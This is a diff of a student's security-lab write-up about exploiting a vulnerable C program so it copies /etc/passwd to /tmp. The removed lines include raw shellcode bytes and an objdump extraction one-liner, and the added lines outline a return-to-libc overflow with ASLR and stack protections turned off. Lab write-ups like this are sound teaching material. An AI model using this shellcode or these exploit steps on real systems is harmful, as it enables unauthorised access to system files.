@@ -69,10 +69,8 @@ _start:
 
 ```
 **Question 1**:
-- Compile asm program and C program to executable code. 
-- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
-- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
-**Answer 1**: Must conform to below structure:
+
+### 1. Preparation
 
 I saved the vulnerable C program the file file task1.c and shellcode into task1.asm.
 In order to attack, I will first convert the task1.asm into machine code using the following commands. 
@@ -80,22 +78,28 @@ In order to attack, I will first convert the task1.asm into machine code using t
 ```
 nasm -g -f elf task1.asm
 ld -m elf_i386 -o task1 task1.o
-for i in $(objdump -d task1 |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
 ```
 
-And here is the shellcode in machine format, which is 97 bytes long.
+My idea is I will use system() to execute task1, which generated above. In order to to that, I need to overflow the buffer memory to higher address, which will redirect my program flow to execute task1 as expected.
 
-```
-\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80
-```
-
-Bien Xuan Huy
-
-Consider the stack frame of the main function.
+Consider the stack frame of the main function of task1.c.
 
 <img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/27c1eede74a38d40582d209a1ad113acdb2d19ec/images/task1/mainstackframe.png"><br>
 
+I will replace the return address with the address of system(), set argc to the address of exit(), and set argv to the address of task1. This way, when the program returns, it will run system() as the return address is popped off the stack.
 
+Now I need to find three thing: address of system(), address of exit(), address of task1. Here's the steps:
+
+### 1. Compile task1.c and turn off OS's address space layout randomization
+
+Compiling task1.c and turning off OS's address space layout randomization using these commands:
+
+```
+sudo sysctl -w kernel.randomize_va_space=0
+gcc -g task1.c -o task1.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
+```
+
+### 2. Run gdb and find system 
 
 **Conclusion**: comment text about the screenshot or simply answered text for the question
 
